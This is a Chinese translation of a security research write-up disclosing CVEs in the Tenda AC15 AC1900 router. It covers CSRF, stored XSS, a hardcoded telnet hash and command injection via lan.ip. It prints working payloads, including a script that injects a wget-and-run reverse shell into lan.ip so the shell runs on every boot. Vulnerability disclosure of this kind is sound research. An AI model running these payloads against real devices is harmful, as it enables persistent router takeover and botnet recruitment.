> 原文链接: https://www.anquanke.com//post/id/213416 


# Tenda AC15 AC1900多个漏洞分析


                                阅读量   
                                **233486**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者Sanjana Sarda，文章来源：securityevaluators.com
                                <br>原文地址：[https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68](https://blog.securityevaluators.com/tenda-ac1900-vulnerabilities-discovered-and-exploited-e8e26aa0bc68)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t011483b71022936c56.jpg)](https://p3.ssl.qhimg.com/t011483b71022936c56.jpg)



## 前言

作为ISE Labs对嵌入式设备进行研究的一部分，我们研究了Tenda的AC15 AC1900智能双频千兆Wi-Fi路由器。在研究过程中，我们测试了运行最新固件版本15.03.05.19的路由器。尽管他们最近已从官方发行版中删除了该版本，但我们要提及的是，Tenda自2017年以来就没有更新其固件。但是，仍然可以从Tenda的美国网站下载2019年固件版本。

通过对Tenda AC15 AC1900路由器的研究，我们在其固件上发现了5个CVE。这是不是很有趣，本文接下来将演示攻击者可以使用两种方法获得设备的root权限，这两种方法不需要身份验证，而且可以持久化。值得一提的是，可以利用这些漏洞，可能使路由器成为僵尸网络的一部分，攻击外部系统和内部网络上的其他设备。



## 准备工作

路由器的admin账户的初始密码是`mouse` 。`mouse`的MD5值是（`40203abe6e81ed98cbc97cdd6ec4f144`）本篇文章将会通篇出现这个哈希值。现在我们已经可以成功的通过路由器web界面的认证逻辑，让我们开始寻找针对Web服务的漏洞，这些漏洞可被利用来拿到设备root权限或对设备造成危害。本文将会涉及到各个攻击面，注意任何可能的注入入口，例如客户端可控的参数字段。此后，我们将使用binwalk对固件进行提取，得到二进制程序，并使用IDA Pro对二进制进行逆向和分析。



## 初步分析

我们将首先使用Nmap工具开始对路由器的开放端口进行扫描，以确定路由器的配置方式。因为我们希望Nmap扫描所有TCP端口（从1到65535），确定所有开放的服务，使用的操作系统的版本(使用-A参数），并且提供额外的输出信息(-V参数），所以我们将运行`nmap -p 1–65535 -T4 -A -v 192.168.0.1`，运行命令得到如下重要信息：

```
PORT       STATE      SERVICE      VERSION
23         open       telnet       telnetd
80         open       http         Tenda WAP http admin
1990       open       Stun-p1 
5500       open       Rtsp
8180       open       http         nginx 1.22
9000       open       Cslistener
10004      open       emcrmirccd
```

通过端口扫描的结果，可以确定设备跑了2个http服务程序，1个RTSP和1个STUN程序，尽管这些并没有什么不同的，但是值得注意的是，路由器可能运行了一个telnetd进程，这个进程可能是通过busybox起来的，如果幸运的话，我们可以通过这个端口获得路由器的root shell。



## 不完善的请求认证

我们通过使用burpsuite对web接口进行各种尝试访问，最终确定SysToolReboot 接口作为入口点，SysToolReboot 将会在系统重启之前断开路由器与Internet的联网，并且断网时长达到45秒，通过对下面的GET请求，可以实现对路由器的重启，并且改变路由器的状态

[![](https://p0.ssl.qhimg.com/t01ca4f6cf2efcca289.png)](https://p0.ssl.qhimg.com/t01ca4f6cf2efcca289.png)

重启请求

攻击者可以使一个已经通过认证的用户访问恶意的url链接，从而造成CSRF攻击。CSRF攻击会强迫用户执行一些意外的操作，导致设备的重启以及状态的改变，并且这都利用了用户已经通过身份认证的特性。例如，攻击者可以通过一个HTML的`&lt;img&gt;`标签来触发这个重启系统的GET请求。比如，攻击者将这个恶意的url伪装在一个0x0大小的图片链接中，当用户访问了这个恶意的`&lt;img&gt;`的时候，浏览器会发起一个request请求去获取这个图片，但是获取图片不成，反而造成了系统的重启。标签内容如下：

```
&lt;img src="http://192.168.0.1/goform/SysToolReboot" width="0" height="0" border="0"&gt;
```

当然攻击者也可以通过一些社工的方式，使用一些更简单的办法，让已经通过认真的用户去访问`http://192.168.0.1/goform/SysToolReboot`这个url，同样可以取得重启路由器的效果，因为这个重启的操作只需要一个GET请求



## 不完善的输入校验

通过更多的测试，我们到达了wifi配置的界面，这里我们可以配置wifi的名字，wifi的密码，这些参数都是用户可控的，这些参数都会影响用户在连接wifi的配置。

[![](https://p1.ssl.qhimg.com/t019c335ebc59d30e5d.png)](https://p1.ssl.qhimg.com/t019c335ebc59d30e5d.png)

web的登录界面

通过更进一步的检查，我们发现路由器并没有对输入的参数进行完善的校验，我们可以向输入中注入代码`&lt;script&gt;alert(document.cookie)&lt;/script&gt;`，导致一个XSS的攻击，比如当用户去访问这个配置界面的时候就会弹出一个显示cookie的alert，这个就是浏览器执行注入代码的结果。

[![](https://p1.ssl.qhimg.com/t0120d454b3a9b4ec8d.png)](https://p1.ssl.qhimg.com/t0120d454b3a9b4ec8d.png)

这样我们就实现了一个持久化的XSS漏洞，每当用户访问界面中包含WIFI的名字或者密码的时候，都会导致这个注入代码的执行。这和之前发现的CSRF漏洞组合起来就可以导致一个持久的拒绝服务攻击。但是这是一个需要身份认证的攻击面，所以攻击成本比较大，条件比较苛刻。由于我们的目标是尽量的减少被攻击者的参与，以及攻击者所需要的权限，因此我们通过研究固件，继续挖掘更深层次的漏洞。



## 硬编码的登陆凭证

就像[CVE-2018-5770](https://www.cvedetails.com/cve/CVE-2018-5770/), 一个未经认证的远程用户可以在Tenda AC15路由器上启动一个telnetd服务，并且可以通过这个服务获得root权限。但是最新版本的固件v19, 已经禁用了这个硬编码的后门账户，我们不能再通过这个账户获得root权限了。但是，这个telnet账户密码md5值`9B60FC59706134759DBCAEA58CAF9068`却是硬编码在固件中的，因此我们可以通过爆破这个md5值得到密码，下图显示了硬编码md5的二进制代码以及登陆这个telnet服务的PoC。

[![](https://p3.ssl.qhimg.com/t01760810316486bee6.png)](https://p3.ssl.qhimg.com/t01760810316486bee6.png)

Tenda_login 二进制文件

[![](https://p1.ssl.qhimg.com/t01dfc9d2210e88c2b3.png)](https://p1.ssl.qhimg.com/t01dfc9d2210e88c2b3.png)

Telent Login



## RCE漏洞CVE-2020–10987 &amp; CVE-2020–15916

当我们对httpd的二进制程序进行更进一步的研究，发现deviceName参数和lanIp字段都是借传到了`doSystemCmd`函数中的，这会导致一个任意的命令执行。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t012bf42c98e0e9a867.png)

直接传入`deviceName`

[![](https://p2.ssl.qhimg.com/t014acd29b8f7301b63.png)](https://p2.ssl.qhimg.com/t014acd29b8f7301b63.png)

直接传入`lan.ip`

deviceName的值可以通过认证请求传给web接口，例如像下面这样，可以直接导致路由器的强制重启

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0133924840f568f6f3.png)

使用`deviceName`实现命令注入

同样的，`lan.ip`的值也可以通过相似的web接口传给路由器，但是这种请求更为少见，或者是通过启动telnet程序使用`cfm`传递`lan.ip`的值。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0103e7939c79cdbc23.png)

设置 lan.ip

这种攻击可以持久化，因为lan.ip的值一般情况下不会改变，除非进行出厂化设置才会改变。改变lan.ip的值会暂时导致wifi失效，如果想让路由器的功能正常，还需要重启路由器。



## 更深入的研究

尽管我们可以通过telnet获得路由器的root权限，我们可以更进一步的利用这个漏洞，我们可以在路由器上实现一个持久化的反弹shell。

由于路由器上的busybox程序支持wget，所以我们可以下载一个反弹shell(这个例子中我们把端口配置为8213)到`/tmp`目录下。当我们执行这个命令的时候，我们可以获得root 权限，这个文件在每次重启的时候都会重启。一个更好的办法获得持久的root权限是通过lan.ip的命令注入实现在每次重启的时候下载和运行shell。我们通过创建如下的脚本(`sizzle`)来实现这个功能，可以自动设置lan.ip并且连接我们的端口。需要注意的是，lan.ip中的命令仅会在系统启动的时候执行一次。

```
#! /bin/sh
cfm set lan.ip '192.168.0.1; cd tmp; wget http://192.168.0.112:8000/shell; chmod +x shell; ./shell'
cd tmp; 
wget http://192.168.0.112:8000/shell; 
chmod +x shell;
./shell
```

[![](https://p4.ssl.qhimg.com/t01532a66aa934a00c5.png)](https://p4.ssl.qhimg.com/t01532a66aa934a00c5.png)

使用`sizzle`脚本和`lan.ip`参数在8192端口上创建反弹shell

我们可以使用Netcat(nc)去监听(`-l`)8123端口(`-p`)的来的数据流，当我们连接路由器的时候可以获得如下的响应。

[![](https://p4.ssl.qhimg.com/t0177874e4b75ed5538.png)](https://p4.ssl.qhimg.com/t0177874e4b75ed5538.png)

8123端口的反弹shell



## 结论

在这篇文章中，我们展示了如何在不进行身份验证的情况下危害和访问此设备，并导致持续拒绝服务攻击。有趣的是，由于Tenda尚未修补这些漏洞，因此其他固件版本中也可能存在类似的漏洞。因此，攻击者可能会发现出类似的漏洞，从而影响其他Tenda嵌入式设备。
